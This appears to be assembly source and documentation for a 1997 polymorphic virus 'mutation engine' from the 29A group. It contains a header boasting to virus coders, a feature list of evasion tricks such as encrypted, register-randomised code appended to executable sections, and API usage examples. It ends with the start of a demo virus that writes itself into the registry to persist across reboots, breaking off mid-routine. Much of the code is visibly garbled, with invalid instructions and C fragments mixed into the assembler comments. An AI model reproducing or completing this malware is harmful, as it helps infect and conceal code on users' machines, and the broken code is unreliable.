;  Ŀ
;    Dark Elf Mutation Engine [DEME] v1.0b                      
;                                                                 
;   coded by: vulgarity/29a                                      
;                                                                 
;                                               
;.---------------------------------.
;                                   |
;  "It's hard to find absolute,    |
;   self-respecting bullshit."     |
;                                   |   
;  A new way of thinking          |  
;  or just another lame couple    | 
;  of stupid ideas? Well,         |    
;  who cares! As long as it       |  
;  works and does its job,        |     
;  I care not what it looks like  |     
;  outside of that. And guess     |   
;  what? It works! And that's      |     
;  all that really counts!        |        
;  Greetings go out to all the   |          
;  other virus coders around the  |   
;  world... Keep up the good work.|   
;                                   |
;'---------------------------------'
;                                   |
; damn well sick and can't do shit|  
; time for some virus writing, so  |  
; here comes the DEME v1.0b... a  |   
; simple but effective mutation   |   
; engine...                       
;                                   |   
;(c)opyright 1997 - vulgarity/29a  |   
;                                   |  
;\\_______________________________//
;                                   /
.;----------------------------------.
;                                   |
;  Some features:                   
;                                   |
;  - polynomial mutation (using FPU|
;   operations)
;  - direct action (no need to     |
;   load into memory first)
;  - no engine size boundary (the  |
;   host won't change its size if  |
;   the engine is biger than it    |
;   thinks...)
;  - no host modification (virus   |
;   will be appended to the last  |
;   section)                      
;  - random registers used for      |
;   encryption/decryption process  |
;  - easy to use                  
;  - no voids in the encoded data  | 
;                                   | 
;  how to use it:                   
;                                   | 
;  ; Call the api function once and |
;  ; then call DE_HOST before you   |
;  ; call any infected file.        
;  _declspec(naked) DE_API()       
;  {                                
;  _asm                          // 
;  {                               //
;    call dwOffset                 // <-- this one
;    mov  eax,dwOffset             // 
;  }                                //
;  __declspec(naked) DE_HOST()     // call DE_HOST
;  {                                 // 
;    _asm                          // 
;    {                               //
;      call dwOffsetH               // 
;      mov  ebx,dwOffsetH           // 
;    }                               //
;    // ..host code ..              //
;  }                                 //
;  }                                 //
;  ;----------------------------------------------------------------------------;
;  ;                                                                               ;
;  ; Parameters to the DE_API:                                                     ;
;  ;                                                                             ;
;  ;  EDX : - offset of the host (entry point)                                    ;
;  ;  ECX : - number of bytes to encrypt                                           ;
;  ;  EBX : - base/displacement value (use 0 if none)                             ;
;  ;  ESI : - pointer to enc_data_out (where to store the encrypted data)        ;
;  ;  EDI : - pointer to enc_data_in (data to encode)                            ;
;  ;                                                                               ;
;  ; Return values                                                                 ;
;  ;                                                                               ;
;  ;  EAX : - new code (encrypted)                                                 ;
;  ;                                                                               ;
;  ; Example                                                                       ;
;  ;                                                                               ;
;  ;_declspec(naked) DE_API()                                                      ;
;  ;{                                                                               ;
;  ;__asm                                                                          ;
;  ;{                                                                               ;
;  ;  push  ebp                                                                   ;
;  ;  mov   ebp,esp                                                                ;
;  ;  sub   esp,(length of all variables)                                          ;
;  ;                                                                               ;
;  ;  ; save registers                                                             ;
;  ;  push  esi edi                                                                ;
;  ;                                                                               ;
;  ;  ; save displacement                                                          ;
;  ;  mov   [ebp-offset],ebx                                                       ;
;  ;                                                                               ;
;  ;  ; get params                                                                 ;
;  ;  mov   eax,[ebp+arg edx]                                                      ;
;  ;  mov   ecx,[ebp+arg ecx]                                                      ;
;  ;  mov   ebx,[ebp+arg ebx]                                                      ;
;  ;  mov   edi,[ebp+arg edi]                                                      ;
;  ;  push  eax                                                                    ;
;  ;  push  ecx                                                                    ;
;  ;  push  edi                                                                    ;
;  ;  push  dword ptr ds:[DE_Data]                                                 ;
;  ;  call  DWORD PTR ds:[DE_Mutate]                                              ;
;  ;  pop   ebp                                                                    ;
;  ;  pop   edi esi                                                                ;
;  ;  add   esp,((number of pushed regs)*4)                                        ;
;  ;  leave                                                                        ;
;  ;  ret                                                                           ;
;  ;}                                                                               ;
;  ;};                                                                              ;
;  ;--------------------------------------------------------------------------------;
;  ;--------------------------------------------------------------------------------;
;  ;                                                                               ;
;  ; Parameters to the DE_HOST                                                     ;
;  ;                                                                               ;
;  ;  EDX : - offset of entry point                                               ;
;  ;  EBP : - image base (displacement value)                                     ;
;  ;                                                                               ;
;  ; Return values                                                                 ;
;  ;                                                                               ;
;  ;  EAX : - new code (encrypted)                                                 ;
;  ;                                                                               ;
;  ; Example                                                                       ;
;  ;                                                                               ;
;  ;_declspec(naked) DE_HOST ()                                                   ;
;  ;{                                                                               ;
;  ;__asm                                                                          ;
;  ;{                                                                               ;
;  ;  push  ebp  edi esi                                                            ;
;  ;  mov   ebp,[esp]                                                               ;
;  ;  add   ebp,[esp+(number of pushed regs)+4]; image base                       ;
;  ;  lea   eax,[DE_Code]                                                           ;
;  ;  push  eax eip+3                                                              ;
;  ;  push  ebx                                                                    ;
;  ;  push   eax                                                                   ;
;  ;  push   dword ptr cs:[offset DE_Data]                                         ;
;  ;  call   DWORD PTR cs:[offset DE_Mutate]                                       ;
;  ;  pop   ebp                                                                    ;
;  ;  pop   edi esi                                                                ;
;  ;  add   esp,((number of pushed regs)*4)                                        ;
;  ;  retn                                                                         ;
;  ;}}                                                                              ;
;  ;-------------------------------------------------------------------------------;
;  ;                                                                               ;
;  ; Notes                                                                         ;
;  ;                                                                               ;
;  ; - If you want to use the displacement feature, push it on the stack with the ;
;  ;   API and retrieve it with the HOST. Otherwise, just pass 0 as displacement   ;
;  ; - Make sure that the displacement + the address of the code to encrypt is a  ;
;  ;   32 bit boundry (if not, add some NOPs...)                                    ;
;  ;                                                                               ;
;  ; To get the encrypted data, simply retrieve the data pointed to by EBP after  ;
;  ; the API has been called                                                       ;
;  ;                                                                               ;
;  ; Have fun!                                                                     ;
;  ;                                                                               ;
;  \_____________________________________________________________________________/ ;
;                                                                                   ;
;   Disclaimer                                                                      ;
;   The author(s) takes absolutely no responsibility for any damage caused by any  ;
;   part(s) of this software. Please use responsibly.                              ;
;                                                                                   ;
;  ;                                                                                  ;
;  length_de_data                        equ    ((enc_data_end-de_data)+15)/16*16  ;
;  length_encrypted_data                 equ    ((enc_data_end-hed_data)+15)/16*16  ;
;  length_polynomial_table               equ    256*4                              ;
;  length_decode_opcodes                 equ    (decode_opcodes_end-decode_opcodes) ;
;  length_encode_opcodes                 equ    (encode_opcodes_end-encode_opcodes) ;
;

;  ___________
; ┌─┐   ┌─┐
; │.comp.│┌─┐
; └─┘   └─┘
;   windows version   encoding/decoding routine   register table

.386p                                  ;
.model flat,stdcall                     ;

include win32.inc                       ;
include mz_pe.inc                       ;
include mscvcl.inc                      ;
include macro.inc                       ;

locals  ?true                         ;

;-------------------------------------------------------------------------------------
; Simple demo virus to test the DEME...

.data                                   ;
        db 'This is some dummy code',0  ;
        dd '(C)opyright 1997 - vulgarity/29a',0h

.code                                   ;
start:                                  ;
  call DE_API                          ;
  call DE_HOST                         ;
  pushad                               ;
  call GetVersion                      ;
  cmp eax,0FFFFF000h                  ; already loaded? (avoid mem conflict) 
  jz restore_host                      ;
  mov dl,1                             ; 1 - write vxsreg file
  call WriteReg                        ; write virus in registry so in case
                                       ; of a reboot, the virus should continue
                                       ; to operate
  push 0Bh                            
  call ExitProcess                     
WriteReg:                              
  pushad
  pushfd
  
  push 800